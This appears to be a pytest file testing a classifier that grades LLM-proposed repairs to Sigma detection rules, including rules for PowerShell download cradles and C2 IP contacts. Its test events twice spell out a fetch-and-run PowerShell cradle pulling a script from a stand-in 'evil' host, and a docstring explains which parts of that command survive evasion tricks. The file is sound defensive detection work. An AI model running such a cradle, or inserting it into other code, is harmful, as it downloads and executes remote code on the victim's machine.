"""Stage 3 Phase 3, Part 2: known-answer validation of the three-outcome
classifier, gate-enforced not LLM-asserted. No real LLM call here -
`GeneratedRepair` objects are constructed by hand so the classifier's own
logic can be validated deterministically, the same "known-answer before
trusting it" discipline mechanic.evasion's tests used in Phase 2. The one
real LLM-in-the-loop run is the Part 0 smoke test plus the Part 3
stratified batch, both live (not unit tests).

Reuses Phase 1's exact rule text (`test_gate_hand_repairs` constants) so
there is no risk of silently testing different rules than the rest of the
project already proved things about.
"""

from pathlib import Path

import pytest

from mechanic import repair_outcome as ro, verify
from mechanic.repair_generator import GeneratedRepair

try:
    verify.find_rsigma_binary()
    _RSIGMA_AVAILABLE = True
    _RSIGMA_SKIP_REASON = ""
except verify.VerifyError as e:
    _RSIGMA_AVAILABLE = False
    _RSIGMA_SKIP_REASON = str(e)

pytestmark = pytest.mark.skipif(not _RSIGMA_AVAILABLE, reason=_RSIGMA_SKIP_REASON)

import test_gate_hand_repairs as phase1  # noqa: E402


def _write(tmp_path: Path, name: str, text: str) -> Path:
    p = tmp_path / name
    p.write_text(text)
    return p


def _fake_generated(yaml_text=None, *, no_repair=False, note=None) -> GeneratedRepair:
    return GeneratedRepair(
        proposed_rule_yaml=yaml_text,
        raw_model_text=yaml_text or ("NO_LOGIC_REPAIR_POSSIBLE" if no_repair else "<garbage>"),
        model="test-fixture",
        endpoint="test-fixture",
        no_repair_signal=no_repair,
        parse_note=note,
    )


# ---------------------------------------------------------------------------
# GENERATION_FAILURE
# ---------------------------------------------------------------------------


def test_generation_failure_when_no_yaml_and_no_signal(tmp_path):
    original = _write(tmp_path, "orig.yml", phase1.R5_ORIGINAL)
    generated = GeneratedRepair(
        proposed_rule_yaml=None, raw_model_text="uh, I'm not sure", model="m", endpoint="e", no_repair_signal=False,
        parse_note="model response contained neither a ```yaml fenced block nor the NO_LOGIC_REPAIR_POSSIBLE sentinel",
    )
    verdict = ro.classify_repair(original, generated, {"DestinationIp": "203.0.113.77"}, [{"DestinationIp": "93.184.216.34"}])
    assert verdict.outcome == ro.OUTCOME_GENERATION_FAILURE
    assert verdict.tier == "IOC"


def test_generation_failure_on_malformed_yaml(tmp_path):
    original = _write(tmp_path, "orig.yml", phase1.R5_ORIGINAL)
    generated = _fake_generated("title: [unterminated\n  detection: {")
    verdict = ro.classify_repair(original, generated, {"DestinationIp": "203.0.113.77"}, [{"DestinationIp": "93.184.216.34"}])
    assert verdict.outcome == ro.OUTCOME_GENERATION_FAILURE


def test_generation_failure_on_valid_yaml_that_is_not_a_valid_sigma_rule(tmp_path):
    original = _write(tmp_path, "orig.yml", phase1.R5_ORIGINAL)
    generated = _fake_generated("just_a_plain: mapping\nwith_no_detection_block: true\n")
    verdict = ro.classify_repair(original, generated, {"DestinationIp": "203.0.113.77"}, [{"DestinationIp": "93.184.216.34"}])
    assert verdict.outcome == ro.OUTCOME_GENERATION_FAILURE


# ---------------------------------------------------------------------------
# RETIRE via the model's own no-repair signal (NOT gate-verified - reported
# distinctly, per the module's own docstring)
# ---------------------------------------------------------------------------


def test_retire_via_model_no_repair_signal(tmp_path):
    original = _write(tmp_path, "orig.yml", phase1.R5_ORIGINAL)
    generated = _fake_generated(None, no_repair=True)
    verdict = ro.classify_repair(original, generated, {"DestinationIp": "203.0.113.77"}, [{"DestinationIp": "93.184.216.34"}])
    assert verdict.outcome == ro.OUTCOME_RETIRE
    assert verdict.gate_report is None  # nothing was gated - no rewrite existed to check
    assert "model signaled" in verdict.reason


# ---------------------------------------------------------------------------
# RETIRE via a gate-checked but rejected/insufficiently-exercised rewrite
# ---------------------------------------------------------------------------


def test_retire_via_gate_fail_overly_broad_repair(tmp_path):
    original = _write(tmp_path, "orig.yml", phase1.R3_ORIGINAL)
    generated = _fake_generated(phase1.R3_BAD_REPAIR)
    tp_event = {
        "Image": "C:\\Windows\\System32\\powershell.exe",
        "CommandLine": "powershell.exe -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil/a.ps1')\"",
    }
    benign = [
        {"Image": "C:\\Windows\\System32\\powershell.exe", "CommandLine": "powershell.exe -File C:\\Scripts\\Backup.ps1"},
        {"Image": "C:\\Windows\\System32\\powershell.exe", "CommandLine": "powershell.exe Get-Process | Where-Object {$_.CPU -gt 10}"},
        {"Image": "C:\\Windows\\System32\\powershell.exe", "CommandLine": "powershell.exe -Command \"Get-ChildItem C:\\Logs\""},
    ]
    verdict = ro.classify_repair(original, generated, tp_event, benign)
    assert verdict.outcome == ro.OUTCOME_RETIRE
    assert "NO_NEW_FALSE_POSITIVES" in verdict.failed_conditions
    assert verdict.gate_report is not None


def test_retire_via_not_fully_exercised_pass_ioc_tier(tmp_path):
    """The R5 lesson, wired into the outcome classifier itself: a gate PASS
    that rested on zero mechanical evasions (IOC-tier, none apply) must
    NOT be reported as a logic repair."""
    original = _write(tmp_path, "orig.yml", phase1.R5_ORIGINAL)
    generated = _fake_generated(phase1.R5_ATTEMPTED_REPAIR)
    verdict = ro.classify_repair(original, generated, {"DestinationIp": "203.0.113.77"}, [{"DestinationIp": "93.184.216.34"}])
    assert verdict.outcome == ro.OUTCOME_RETIRE
    assert verdict.gate_report is not None
    assert verdict.gate_report["verdict"] == "PASS"
    assert verdict.gate_report["fully_exercised"] is False
    assert "fully_exercised=False" in verdict.reason


# ---------------------------------------------------------------------------
# TELEMETRY_REPAIR
# ---------------------------------------------------------------------------


def test_telemetry_repair_detected_for_field_absent_from_event(tmp_path):
    original = _write(tmp_path, "orig.yml", phase1.R5_ORIGINAL)
    telemetry_gap_repair = """
title: Known Malicious C2 IP Contacted (repair referencing telemetry we don't have)
id: c46a099c-2a31-401d-9ed1-e4be17ac0a7b
status: test
logsource: {category: network_connection, product: windows}
detection:
    selection:
        Initiated: 'true'
        DestinationPort: 443
    condition: selection
level: critical
tags: [attack.command-and-control]
"""
    generated = _fake_generated(telemetry_gap_repair)
    verdict = ro.classify_repair(original, generated, {"DestinationIp": "203.0.113.77"}, [{"DestinationIp": "93.184.216.34"}])
    assert verdict.outcome == ro.OUTCOME_TELEMETRY_REPAIR
    assert set(verdict.telemetry_missing_fields) >= {"Initiated", "DestinationPort"}
    assert verdict.gate_report is None  # advice only - the gate is never even run


# ---------------------------------------------------------------------------
# LOGIC_REPAIR - the only success outcome, and it must be REACHABLE: a
# repair keyed on a substring OUTSIDE every region the mechanical
# transformer mutates survives all of them.
# ---------------------------------------------------------------------------


def test_logic_repair_reachable_when_repair_keys_outside_the_mutated_region(tmp_path):
    """R3's original fragile atom is the whole literal
    'IEX (New-Object Net.WebClient).DownloadString' - character-insertion
    only fragments alpha runs of 2-8 chars within it (IEX/New/Object/Net),
    and reordering only reorders whitespace-separated tokens, never their
    contents. 'WebClient' (9 chars) and 'DownloadString' (14 chars) are
    both too long for char-insertion and are never split across a token
    boundary reordering touches - so a repair keyed on 'WebClient' alone
    survives every mechanical evasion of this atom, is still an accurate,
    narrow catch (still Image=powershell.exe + WebClient, not broadened to
    all of powershell.exe), and should reach LOGIC_REPAIR: proof this
    outcome is not vacuously unreachable under the mechanical-evasion gate."""
    original = _write(tmp_path, "orig.yml", phase1.R3_ORIGINAL)
    durable_repair = """
title: Suspicious PowerShell Download Cradle (repaired - keys on WebClient, outside the mutated region)
id: 42d4290b-a97c-4b30-814f-2d18c6fc3328
status: test
logsource: {category: process_creation, product: windows}
detection:
    selection:
        Image|endswith: '\\\\powershell.exe'
        CommandLine|contains: 'WebClient'
    condition: selection
level: high
tags: [attack.execution, attack.t1059.001]
"""
    generated = _fake_generated(durable_repair)
    tp_event = {
        "Image": "C:\\Windows\\System32\\powershell.exe",
        "CommandLine": "powershell.exe -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil/a.ps1')\"",
    }
    benign = [
        {"Image": "C:\\Windows\\System32\\powershell.exe", "CommandLine": "powershell.exe -File C:\\Scripts\\Backup.ps1"},
        {"Image": "C:\\Windows\\System32\\powershell.exe", "CommandLine": "powershell.exe Get-Process | Where-Object {$_.CPU -gt 10}"},
        {"Image": "C:\\Windows\\System32\\powershell.exe", "CommandLine": "powershell.exe -Command \"Get-ChildItem C:\\Logs\""},
    ]
    verdict = ro.classify_repair(original, generated, tp_event, benign)
    assert verdict.outcome == ro.OUTCOME_LOGIC_REPAIR, verdict.to_dict()
    assert verdict.gate_report["verdict"] == "PASS"
    assert verdict.gate_report["fully_exercised"] is True
    assert verdict.mechanical_evasions_confirmed >= 1
